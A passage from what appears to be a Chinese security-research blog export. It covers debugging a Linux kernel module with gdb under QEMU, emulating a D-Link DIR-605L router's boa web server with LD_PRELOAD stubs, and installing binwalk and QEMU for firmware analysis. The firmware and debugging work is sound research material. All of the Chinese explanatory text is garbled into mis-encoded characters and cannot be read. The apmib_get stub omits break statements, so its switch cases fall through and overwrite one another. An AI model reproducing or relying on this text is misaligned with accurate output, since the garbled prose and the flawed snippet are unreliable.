<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br><span class="line">/ <span class="comment"># grep ko_test /proc/modules</span></span><br><span class="line">ko_test 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ç›®æ ‡å†…æ ¸æ¨¡å—å„ä¸ª <code>section</code> çš„é¦–åœ°å€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># grep &quot;0x&quot; /sys/module/ko_test/sections/.*</span></span><br><span class="line">/sys/module/ko_test/sections/.gnu.linkonce.this_module:0xffffffffc0004000</span><br><span class="line">/sys/module/ko_test/sections/.note.Linux:0xffffffffc0003054</span><br><span class="line">/sys/module/ko_test/sections/.note.gnu.build-id:0xffffffffc0003000</span><br><span class="line">/sys/module/ko_test/sections/.rodata.str1.1:0xffffffffc0003024</span><br><span class="line">/sys/module/ko_test/sections/.strtab:0xffffffffc0007378</span><br><span class="line">/sys/module/ko_test/sections/.symtab:0xffffffffc0007000</span><br><span class="line">/sys/module/ko_test/sections/.text:0xffffffffc0002000</span><br></pre></td></tr></table></figure>

<p>åœ¨ gdb çª—å£ä¸­åŠ è½½è°ƒè¯•ç¬¦å·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file mydrivers/ko_test.ko &lt;ko_test_base_addr&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨æ­¤å¤„ï¼Œå‘½ä»¤å¯ä»¥ä¸º</span></span><br><span class="line">gefâ¤  add-symbol-file mydriver/ko_test.ko 0xffffffffc0002000</span><br><span class="line">add symbol table from file <span class="string">&quot;mydriver/ko_test.ko&quot;</span> at</span><br><span class="line">	.text_addr = 0xffffffffc0002000</span><br><span class="line">Reading symbols from mydriver/ko_test.ko...done.</span><br></pre></td></tr></table></figure>

<p><strong>ä¾‹å­ï¼šnokaslr</strong><br>è¿™é‡Œç®€å•å™è¿°ä¸€ä¸‹è°ƒè¯• ko_test æ¨¡å—å‡½æ•°çš„ä¾‹å­<br>é¦–å…ˆï¼Œå¯åŠ¨ QEMU åŠ gdb<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061251955.png"><br>è¯»å– vmlinux ç¬¦å·è¡¨å¹¶ç»§ç»­æ‰§è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061255929.png"><br>æŸ¥çœ‹æ˜¯å¦å·²ç»è£…è½½æ¨¡å—ï¼ŒåŠç¡®è®¤æ¨¡å—åœ°å€ä¿¡æ¯<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061302059.png"><br>åœ¨ gdb è°ƒè¯•ç•Œé¢æŒ‰ä¸‹ Ctrl+C æ–­ä¸‹ kernelï¼Œå¹¶æ·»åŠ  ko_test ç¬¦å·ä¿¡æ¯<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061305485.png"><br>åœ¨ ko_test æ¨¡å—å‡½æ•°å¤„ä¸‹æ–­ç‚¹<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061307459.png"><br>ç»§ç»­è¿è¡Œ kernelï¼Œå¯¹ ko_test è¿›è¡Œå¸è½½å¹¶é‡æ–°è£…å¡«ï¼Œå¯ä»¥çœ‹åˆ° gdb ä¼šåœ¨æ–­åœ¨æ¨¡å—å‡½æ•°å¤„<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061309841.png"><br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061312650.png"></p>
<p>è¿™é‡Œæ˜¯åˆ©ç”¨ nokaslr ä¸‹ç›¸åŒé©±åŠ¨åŠ è½½åŸºåœ°å€ä¸å˜çš„åŸç†è¿›è¡Œä¸‹æ–­ç‚¹</p>
<!-- **ä¾‹å­ï¼škaslr**
å¦‚ä½•åœ¨å¼€å§‹ ``kaslr`` æ—¶è°ƒè¯• ``init`` å‡½æ•°ï¼Ÿ
åœ¨æ¨¡å—è¢«è£…å¡«è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨ ``load_module`` å‡½æ•°ï¼Œåœ¨å…¶å†…éƒ¨ä¼šè°ƒç”¨ ``do_init_module`` å‡½æ•°å¯¹æ¨¡å—è¿›è¡Œåˆå§‹åŒ–,
å…¶ä¸­ ``load_module`` å‡½æ•°å¯¹åº” SYSCALL å‡½æ•°çš„ ``init_module`` è°ƒç”¨ 

ç”±äºåœ¨ kernel å¯ç”¨æ—¶ä¼šåŠ è½½ç³»ç»Ÿæ¨¡å—ï¼Œå…ˆè®© kernel åŠ è½½å®Œæ¯•ï¼Œç„¶å Ctrl+C æ–­æ‰å¹¶åœ¨ ``do_init_module`` å¤„ä¸‹æ–­ç‚¹ï¼Œè¯¥å‡½æ•°å‰åŠéƒ¨åˆ†ä¼šæ‰§è¡Œå†…æ ¸æ¨¡å—çš„ ``init`` å‡½æ•°
![](https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061331847.png)
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This is <span class="built_in">where</span> the real work happens.</span><br><span class="line"> *</span><br><span class="line"> * Keep it uninlined to provide a reliable breakpoint target, e.g. <span class="keyword">for</span> the gdb</span><br><span class="line"> * helper <span class="built_in">command</span> <span class="string">&#x27;lx-symbols&#x27;</span>.</span><br><span class="line"> */</span><br><span class="line">static noinline int do_init_module(struct module *mod)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  /* Start the module */</span><br><span class="line">  <span class="keyword">if</span> (mod-&gt;init != NULL)</span><br><span class="line">    ret = do_one_initcall(mod-&gt;init);   // &lt;- æ­¤å¤„æ‰§è¡Œ ko_test_init å‡½æ•°</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; 0) &#123;</span><br><span class="line">    goto fail_free_freeinit;</span><br><span class="line">  &#125;</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ”¾å¼€ kernelï¼ŒåŠ è½½æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ° gdb æ–­æ‰ â€“&gt;</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿®å¤è·¯ç”±å™¨ç¨‹åºè¿è¡Œç¯å¢ƒ</title>
    <url>/2022/05/05/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="å›ºä»¶ä¿¡æ¯"><a href="#å›ºä»¶ä¿¡æ¯" class="headerlink" title="å›ºä»¶ä¿¡æ¯"></a>å›ºä»¶ä¿¡æ¯</h2><p>æœ¬ç« ä»¥ D-Link DIR-605Lï¼ˆFW_113ï¼‰è·¯ç”±å™¨ä¸ºä¾‹</p>
<p>ä¸‹è½½é“¾æ¥ï¼š	<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP">ftp://FTP2.DLINK.COM/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP</a></p>
<p>æŸ¥çœ‹ä¿¡æ¯ï¼Œè§£å‹å¹¶æå–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3$ binwalk -e dir605L_FW_113.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">11280         0x2C10          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2129920 bytes</span><br><span class="line">563234        0x89822         Squashfs filesystem, big endian, version 2.0, size: 64160 bytes, 7 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:03:47</span><br><span class="line">628788        0x99834         Squashfs filesystem, big endian, version 2.0, size: 2301312 bytes, 495 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:04:00</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æå–ç»“æœï¼Œå¯ä»¥çœ‹åˆ°ç³»ç»Ÿä¿¡æ¯å­˜åœ¨äº <code>squashfs-root-0</code> ç›®å½•ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3$ tree -L 2 _dir605L_FW_113.bin.extracted/</span><br><span class="line">_dir605L_FW_113.bin.extracted/</span><br><span class="line">â”œâ”€â”€ 2C10</span><br><span class="line">â”œâ”€â”€ 2C10.7z</span><br><span class="line">â”œâ”€â”€ 89822.squashfs</span><br><span class="line">â”œâ”€â”€ 99834.squashfs</span><br><span class="line">â”œâ”€â”€ squashfs-root</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ mydlink-watch-dog.sh</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ opt.local</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ signalc</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ tsa</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ uplog</span><br><span class="line">â”‚Â Â  â””â”€â”€ version</span><br><span class="line">â””â”€â”€ squashfs-root-0</span><br><span class="line">    â”œâ”€â”€ bin</span><br><span class="line">    â”œâ”€â”€ dev</span><br><span class="line">    â”œâ”€â”€ etc</span><br><span class="line">    â”œâ”€â”€ lib</span><br><span class="line">    â”œâ”€â”€ mydlink</span><br><span class="line">    â”œâ”€â”€ proc</span><br><span class="line">    â”œâ”€â”€ sbin</span><br><span class="line">    â”œâ”€â”€ tmp -&gt; /dev/null</span><br><span class="line">    â”œâ”€â”€ usr</span><br><span class="line">    â”œâ”€â”€ var</span><br><span class="line">    â”œâ”€â”€ web</span><br><span class="line">    â””â”€â”€ web-lang -&gt; /dev/null</span><br></pre></td></tr></table></figure>

<h2 id="å°è¯•è¿è¡Œå¹¶ä¿®å¤-Web-æœåŠ¡å™¨ç¨‹åº"><a href="#å°è¯•è¿è¡Œå¹¶ä¿®å¤-Web-æœåŠ¡å™¨ç¨‹åº" class="headerlink" title="å°è¯•è¿è¡Œå¹¶ä¿®å¤ Web æœåŠ¡å™¨ç¨‹åº"></a>å°è¯•è¿è¡Œå¹¶ä¿®å¤ Web æœåŠ¡å™¨ç¨‹åº</h2><p>ä½¿ç”¨ QEMU è¿›è¡Œæ¨¡æ‹Ÿè¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mips-static) .</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static ./bin/boa</span><br><span class="line">Initialize AP MIB failed!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æŠ¥é”™ï¼Œä¿¡æ¯ä¸º <code>Initialize AP MIB failed</code>ï¼Œåœ¨ <code>JEB</code> æ‰“å¼€ <code>boa</code> è¿›è¡Œå­—ç¬¦ä¸²å¯»æ‰¾<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051207608.png"><br>æ— è®ºæ˜¯æ ¹æ®åæ±‡ç¼–è¿›è¡ŒæŸ¥çœ‹ï¼Œè¿˜æ˜¯è¿›è¡Œåç¼–è¯‘æŸ¥çœ‹ï¼Œéƒ½èƒ½çœ‹åˆ°é€šè¿‡ <code>apmib_init</code> è¿›è¡Œåˆå§‹åŒ–<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051225819.png"><br>ä½¿ç”¨ JEB æŸ¥çœ‹ <code>apmib.so</code> ä¸­çš„ <code>apmib_init</code>ï¼Œæ­£å¸¸è¿”å›å€¼åº”ä¸º 1<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051230467.png"></p>
<p>å› æ­¤ç¼–å†™å‡½æ•°è¿›è¡ŒåŠ«æŒ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">apmib_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Fake it</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘å¹¶å†æ¬¡è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so</span><br><span class="line"></span><br><span class="line">$ embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> ./bin/boa</span><br><span class="line">Create chklist file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<p>ä¾æ—§æŠ¥é”™ï¼Œæ‰‹ä¸Šæ²¡æœ‰ IDA å°è¯•å¯ç”¨åŠ¨æ€è°ƒè¯•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> -g 1234 ./bin/boa</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051527711.png"></p>
<p>è¿™é‡Œç»“åˆ JEB åæ±‡ç¼–èƒ½çœ‹å‡ºæ¥å±äº apmib_getï¼Œä½†æ˜¯å…¶ä»£ç åŠŸèƒ½åˆ†æå°±æš‚æ—¶ä¸åšäº†ï¼Œæ•´ç†åŠ«æŒå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_IP_ADDR 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_HW_VER 0x250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_CAPTCHA 0x2C1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">apmib_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Fake it;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">apmib_get</span><span class="params">(<span class="type">int</span> code, <span class="type">int</span> *value)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(code)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MIB_HW_VER:</span><br><span class="line">            *value = <span class="number">0xF1</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_IP_ADDR:</span><br><span class="line">            *value = <span class="number">0x7F000001</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_CAPTCHA:</span><br><span class="line">            *value = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘æ‰§è¡Œå¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸè¿è¡Œ boa ç¨‹åº</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> ./bin/boa</span><br><span class="line">Create chklist file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">hard ver is</span><br><span class="line">Create f/w version file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">boa: server version Boa/0.94.14rc21</span><br><span class="line">boa: server built May 25 2012 at 13:03:21.</span><br><span class="line">boa: starting server pid=9326, port 80</span><br><span class="line">Unsupported ioctl: cmd=0x89f0</span><br><span class="line">device ioctl:: Function not implemented</span><br><span class="line">Unsupported ioctl: cmd=0x89f0</span><br><span class="line">device ioctl:: Function not implemented</span><br><span class="line">smart 404 ----------------------------------</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ netstat -an | grep 80</span><br><span class="line">warning, got bogus unix line.</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     </span><br><span class="line">tcp        0      1 192.168.31.110:48678    34.122.121.32:80        SYN_SENT </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ° Web æœåŠ¡å™¨ boa å·²ç»æˆåŠŸè¿è¡Œ</p>
]]></content>
      <categories>
        <category>Iot</category>
        <category>è·¯ç”±å™¨</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title>åµŒå…¥å¼ç¯å¢ƒæ­å»º</title>
    <url>/2022/05/03/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="åŸºæœ¬ç¯å¢ƒ"><a href="#åŸºæœ¬ç¯å¢ƒ" class="headerlink" title="åŸºæœ¬ç¯å¢ƒ"></a>åŸºæœ¬ç¯å¢ƒ</h1><h2 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="åŸºç¡€è®¾ç½®"><a href="#åŸºç¡€è®¾ç½®" class="headerlink" title="åŸºç¡€è®¾ç½®"></a>åŸºç¡€è®¾ç½®</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¿®æ”¹ä¸ºä¸­ç§‘å¤§æº</span></span><br><span class="line"></span><br><span class="line">$ sudo apt install build-essential autoconf <span class="comment"># é…ç½®</span></span><br><span class="line">$ sudo apt install tree jnettop htop <span class="comment"># æŸ¥çœ‹ç›®å½•ã€è¿æ¥ã€æ€§èƒ½</span></span><br><span class="line">$ sudo apt install proxychains4 net-tools <span class="comment"># æŸ¥çœ‹é…ç½®ç½‘ç»œ</span></span><br><span class="line">$ sudo apt install git curl wget  <span class="comment"># ä¸‹è½½</span></span><br><span class="line"></span><br><span class="line">$ sudo apt install python3 python3-pip <span class="comment"># python3 ç¯å¢ƒ</span></span><br><span class="line">$ python3 -m pip install --upgrade pip</span><br><span class="line">$ python3 -m pip -V</span><br><span class="line">pip 21.3.1 from /home/embeded/.local/lib/python3.6/site-packages/pip (python 3.6)</span><br></pre></td></tr></table></figure>

<h1 id="è½¯ä»¶ç¯å¢ƒæ­å»ºæµç¨‹"><a href="#è½¯ä»¶ç¯å¢ƒæ­å»ºæµç¨‹" class="headerlink" title="è½¯ä»¶ç¯å¢ƒæ­å»ºæµç¨‹"></a>è½¯ä»¶ç¯å¢ƒæ­å»ºæµç¨‹</h1><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>Binwalk wiki é“¾æ¥ï¼š<a href="https://github.com/ReFirmLabs/binwalk/wiki">https://github.com/ReFirmLabs/binwalk/wiki</a></p>
<p>å®‰è£…å‚è€ƒé“¾æ¥ï¼š<a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">$ <span class="built_in">cd</span> binwalk</span><br><span class="line">$ sudo python3 setup.py install</span><br><span class="line">...</span><br><span class="line">Installed /usr/local/lib/python3.6/dist-packages/binwalk-2.3.3-py3.6.egg</span><br><span class="line">Processing dependencies <span class="keyword">for</span> binwalk==2.3.3</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> binwalk==2.3.3</span><br><span class="line"></span><br><span class="line">$ binwalk </span><br><span class="line"></span><br><span class="line">Binwalk v2.3.3</span><br><span class="line">Craig Heffner, ReFirmLabs</span><br><span class="line">https://github.com/ReFirmLabs/binwalk</span><br><span class="line"></span><br><span class="line">Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>ä¾æ® Binwalk wiki æ‰€è¯´ï¼Œå…¶å®‰è£…ä¾èµ–åªæœ‰ python è§£é‡Šå™¨ï¼Œå…¶ä½™æ‰€æœ‰ä¾èµ–éƒ½æ˜¯å¯é€‰çš„è¿è¡Œæ—¶ä¾èµ–ï¼Œç›´æ¥æŒ‰é¡ºåºå…¨éƒ¨å®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo python3 -m pip install nose coverage <span class="comment"># æµ‹è¯•/æµ‹è¯•è¦†ç›–ç‡</span></span><br><span class="line"></span><br><span class="line">$ sudo python3 -m pip install pycryptodome <span class="comment"># è§£å¯†çŸ¥ååŠ å¯†å›ºä»¶</span></span><br><span class="line"></span><br><span class="line">$ sudo apt-get install libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy</span><br><span class="line">$ sudo python3 -m pip install pyqtgraph <span class="comment"># ç”Ÿæˆå›¾åŠå¯è§†åŒ–</span></span><br><span class="line"></span><br><span class="line">$ sudo python3 -m pip install capstone <span class="comment"># åæ±‡ç¼–æ¡†æ¶ Python-bindings</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢å¤–çš„å·¥å…·è‡ªåŠ¨æŠ½å–/è§£å‹æ–‡ä»¶å’Œæ•°æ®  </span></span><br><span class="line"><span class="comment"># æ ‡å‡†è§£å‹å·¥å…·</span></span><br><span class="line">$ sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord</span><br><span class="line"></span><br><span class="line"><span class="comment"># é’ˆå¯¹éæ ‡å‡† SquashFS é•œåƒ</span></span><br><span class="line">$ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch</span><br><span class="line">$ (<span class="built_in">cd</span> sasquatch &amp;&amp; ./build.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é’ˆå¯¹ JFFS2 æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">$ sudo python3 -m pip install cstruct</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/sviehb/jefferson</span><br><span class="line">$ (<span class="built_in">cd</span> jefferson &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é’ˆå¯¹ UBIFS æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">$ sudo apt-get install liblzo2-dev python-lzo</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/jrspruitt/ubi_reader</span><br><span class="line">$ (<span class="built_in">cd</span> ubi_reader &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é’ˆå¯¹ YAFFS æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/devttys0/yaffshiv</span><br><span class="line">$ (<span class="built_in">cd</span> yaffshiv &amp;&amp; sudo python3 setup.py install)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é’ˆå¯¹ StuffIt å‹ç¼©æ–‡ä»¶</span></span><br><span class="line">$ wget -O - http://downloads.tuxfamily.org/sdtraces/stuffit520.611linux-i386.tar.gz | tar -zxv</span><br><span class="line">$ sudo <span class="built_in">cp</span> bin/unstuff /usr/local/bin/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="å‡ºç°çš„é—®é¢˜"><a href="#å‡ºç°çš„é—®é¢˜" class="headerlink" title="å‡ºç°çš„é—®é¢˜"></a>å‡ºç°çš„é—®é¢˜</h3><p>:exclamation: æŒ‰ç…§åŸæ–‡å®‰è£…è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™ <code>E: Unable to locate package cramfsprogs</code> éœ€è¦æ‰‹åŠ¨å®‰è£…è¿™ä¸ªåŒ…<br>å®‰è£…åŒ…éƒ½å¯ä»¥ä» <a href="https://launchpad.net/ubuntu">https://launchpad.net/ubuntu</a> æŸ¥æ‰¾</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget -c https://launchpad.net/ubuntu/+archive/primary/+files/cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br><span class="line">$ sudo dpkg -i cramfsprogs_1.1-6ubuntu1_amd64.deb</span><br></pre></td></tr></table></figure>

<p>ã€optionalã€‘ binwalk plugin for ida in linux</p>
<p>è‡³æ­¤ binwalk ç®—æ˜¯å®‰è£…å¥½äº†ï¼Œè‡³äºä½¿ç”¨æ”¾åœ¨åè¯å§</p>
<h2 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h2><h3 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>qemu github é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/qemu/qemu">https://github.com/qemu/qemu</a></p>
<p>qemu å®˜ç½‘ï¼š<a href="https://www.qemu.org/">https://www.qemu.org/</a></p>
<p>å‚è€ƒç½‘ç«™æä¾›çš„å®‰è£…æ–¹å¼ï¼Œç›®å‰ç›´æ¥ä½¿ç”¨ <code>apt</code> å®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install qemu</span><br><span class="line">Suggested packages:</span><br><span class="line">  qemu-user-static samba vde2 qemu-efi openbios-ppc openhackware</span><br><span class="line">  openbios-sparc sgabios ovmf debootstrap sharutils-doc bsd-mailx | mailx</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  binfmt-support cpu-checker ibverbs-providers ipxe-qemu</span><br><span class="line">  ipxe-qemu-256k-compat-efi-roms libaio1 libcacard0 libfdt1 libibverbs1</span><br><span class="line">  libiscsi7 libnl-route-3-200 librados2 librbd1 librdmacm1 libsdl1.2debian</span><br><span class="line">  libspice-server1 libusbredirparser1 libxen-4.9 libxenstore3.0 msr-tools qemu</span><br><span class="line">  qemu-block-extra qemu-slof qemu-system qemu-system-arm qemu-system-common</span><br><span class="line">  qemu-system-mips qemu-system-misc qemu-system-ppc qemu-system-s390x</span><br><span class="line">  qemu-system-sparc qemu-system-x86 qemu-user qemu-user-binfmt qemu-utils</span><br><span class="line">  seabios sharutils</span><br><span class="line"><span class="comment"># å¯ä»¥çœ‹åˆ° qemu-utils qemu-user qemu-system éƒ½è‡ªåŠ¨å®‰è£…æˆåŠŸ</span></span><br><span class="line">$ 